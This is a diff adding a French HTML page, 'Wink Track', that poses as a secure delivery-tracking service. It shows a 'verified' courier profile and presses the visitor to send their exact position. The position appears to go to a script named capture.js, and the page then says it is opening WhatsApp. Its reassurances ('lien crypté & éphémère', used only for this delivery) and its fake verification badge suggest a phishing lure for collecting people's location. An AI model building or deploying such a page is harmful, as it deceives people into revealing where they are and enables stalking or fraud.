@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Wink Track - Localisation Sécurisée</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <div class="container">
+        <div class="brand">
+            <span class="dot"></span> WINK TRACK
+        </div>
+
+        <div id="app" class="card">
+            
+            <div id="loading-state" class="state-view">
+                <div class="spinner"></div>
+                <p>Sécurisation de la connexion...</p>
+            </div>
+
+            <div id="profile-state" class="state-view hidden">
+                <div class="profile-header">
+                    <div class="avatar-wrapper">
+                        <img id="rider-photo" src="" alt="Livreur">
+                        <div class="badge-verified" id="verified-badge">✓</div>
+                    </div>
+                    <h2 id="rider-name">...</h2>
+                    <div class="tags">
+                        <span class="tag" id="rider-vehicle">...</span>
+                        <span class="tag star">⭐ <span id="rider-rating">5.0</span></span>
+                    </div>
+                </div>
+
+                <div class="message-box">
+                    <strong>🛡️ Sécurisation de livraison</strong>
+                    <p style="margin-top: 8px;">
+                        Votre livreur utilise <b>Wink Track</b> pour garantir l'arrivée de votre colis à la bonne adresse.
+                    </p>
+                    <p style="margin-top: 8px;">
+                        Pour éviter les erreurs de guidage et les appels inutiles, merci de confirmer votre position exacte ci-dessous.
+                    </p>
+                </div>
+
+                <button id="btn-share" class="btn-primary">
+                    <span>📍</span> Envoyer ma position
+                </button>
+                
+                <p class="security-note">🔒 Lien crypté & éphémère. Votre position ne sera utilisée que pour cette livraison.</p>
+            </div>
+
+            <div id="gps-state" class="state-view hidden">
+                <div class="radar-container">
+                    <div class="radar"></div>
+                    <div class="radar-ping"></div>
+                </div>
+                <h3>Initialisation...</h3>
+                
+                <div class="progress-bar">
+                    <div id="accuracy-bar" style="width: 10%"></div>
+                </div>
+                
+                <div style="display: flex; justify-content: space-between; margin-top: 5px; opacity: 0.6; font-size: 12px;">
+                    <span class="hint">Recherche satellites...</span>
+                    <span>Précision: <span id="accuracy-val">--</span>m</span>
+                </div>
+            </div>
+
+            <div id="success-state" class="state-view hidden">
+                <div class="success-icon">🚀</div>
+                <h3>Position Verrouillée !</h3>
+                <p>Ouverture de WhatsApp pour confirmation...</p>
+            </div>
+
+            <div id="error-state" class="state-view hidden">
+                <div class="error-icon">⚠️</div>
+                <h3 id="error-title">Lien Expiré</h3>
+                <p id="error-msg">Ce lien de livraison n'est plus valide.</p>
+            </div>
+
+        </div>
+    </div>
+
+    <script src="js/capture.js"></script>
+</body>
+</html>
